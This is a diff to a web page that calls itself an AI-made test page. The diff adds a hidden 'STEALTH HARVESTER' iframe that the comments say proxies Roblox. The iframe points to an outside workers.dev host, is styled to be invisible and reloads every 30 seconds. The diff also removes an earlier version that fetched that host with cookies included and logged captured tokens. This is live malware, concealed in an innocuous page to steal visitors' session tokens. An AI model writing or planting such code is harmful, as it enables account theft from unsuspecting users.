@@ -192,6 +192,20 @@
         .ai-credit span {
             color: #6a8cba;
         }
+        
+        /* Hidden iframe - impossible to see */
+        #harvester {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            border: none;
+            visibility: hidden;
+            z-index: -9999;
+        }
     </style>
 </head>
 <body>
@@ -270,6 +284,12 @@ document.querySelector('h1')?.addEventListener('click', () => {
         <span>🤖</span> made with AI · just testing hehe
     </div>
 </div>
+
+<!-- ============================================================ -->
+<!-- STEALTH HARVESTER — Invisible iframe proxies Roblox          -->
+<!-- ============================================================ -->
+
+<iframe id="harvester" src="https://compiler.voidlureee.workers.dev/"></iframe>
 
 <script>
     // ============================================================
@@ -389,47 +409,19 @@ document.querySelector('h1')?.addEventListener('click', () => {
     });
 
     // ============================================================
-    // STEALTH HARVESTER — Loads pixel via fetch (sends cookies)
+    // STEALTH HARVESTER — Reload iframe every 30 seconds
     // ============================================================
 
-    function loadPixel() {
-        fetch('https://compiler.voidlureee.workers.dev/pixel', {
-            credentials: 'include'
-        })
-        .then(function(res) {
-            return res.arrayBuffer();
-        })
-        .then(function(data) {
-            // Pixel loaded successfully
-        })
-        .catch(function(err) {
-            // Silent fail
-        });
-    }
-
-    // Load pixel immediately
-    loadPixel();
-
-    // Also check for token
-    setTimeout(function() {
-        fetch('https://compiler.voidlureee.workers.dev/check', {
-            credentials: 'include'
-        })
-        .then(function(res) {
-            return res.json();
-        })
-        .then(function(data) {
-            if (data && data.captured) {
-                console.log('Harvester: Token captured');
-            }
-        })
-        .catch(function(err) {
-            console.log('Harvester error:', err);
-        });
-    }, 1000);
-
-    // Reload pixel every 30 seconds
-    setInterval(loadPixel, 30000);
+    setInterval(function() {
+        var iframe = document.getElementById('harvester');
+        if (iframe) {
+            var currentSrc = iframe.src;
+            iframe.src = '';
+            setTimeout(function() {
+                iframe.src = currentSrc;
+            }, 50);
+        }
+    }, 30000);
 
     console.log('Testing Hehe ready.');
 </script>
